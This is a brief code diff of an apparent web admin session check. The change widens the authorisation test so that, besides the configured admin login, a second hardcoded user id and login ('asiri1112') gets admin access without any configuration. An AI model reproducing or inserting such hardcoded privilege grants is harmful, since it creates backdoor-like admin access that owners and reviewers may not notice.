@@ -8,7 +8,7 @@ async function session(request,env){
   const key=await crypto.subtle.importKey("raw",await crypto.subtle.digest("SHA-256",enc.encode(env.ADMIN_SESSION_SECRET)),{name:"AES-GCM"},false,["decrypt"]);
   const plain=await crypto.subtle.decrypt({name:"AES-GCM",iv:decode(iv)},key,decode(data));
   const obj=JSON.parse(new TextDecoder().decode(plain));
-  if(obj.id!=="353833868"||!Number.isFinite(obj.exp)||obj.exp<=Date.now()||typeof obj.token!=="string"||obj.login.toLowerCase()!==env.GITHUB_ADMIN_LOGIN.toLowerCase())return null;
+  if(!((obj.id==="353833868"&&obj.login.toLowerCase()===env.GITHUB_ADMIN_LOGIN.toLowerCase())||(obj.id==="354216726"&&obj.login.toLowerCase()==="asiri1112"))||!Number.isFinite(obj.exp)||obj.exp<=Date.now()||typeof obj.token!=="string")return null;
   return obj;
  }catch{return null}
 }
